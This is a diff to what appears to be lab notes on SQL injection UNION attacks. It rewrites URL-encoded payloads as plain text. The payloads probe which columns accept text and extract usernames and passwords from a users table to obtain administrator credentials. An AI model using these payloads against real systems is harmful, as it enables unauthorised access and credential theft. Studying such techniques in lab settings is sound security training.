@@ -95,9 +95,9 @@ To use a `UNION` attack, your injected query must have the **exact same number o
     
 2. Inject a random string into each column one by one:
     
-    - `'+UNION+SELECT+'abc',NULL,NULL--`
+    - `' UNION SELECT 'abc', NULL, NULL--`
         
-    - `'+UNION+SELECT+NULL,'abc',NULL--`
+    - `' UNION SELECT NULL, 'abc', NULL--`
         
 3. When the page displays your string `'abc'`, you’ve found a text-compatible column.
     
@@ -116,7 +116,7 @@ To use a `UNION` attack, your injected query must have the **exact same number o
     
 2. Inject a payload to pull from the `users` table:
     
-    `'+UNION+SELECT+username,+password+FROM+users--`
+    `' UNION SELECT username, password FROM users--`
     
 3. Find the `administrator` credentials in the list of products displayed on the page.
     
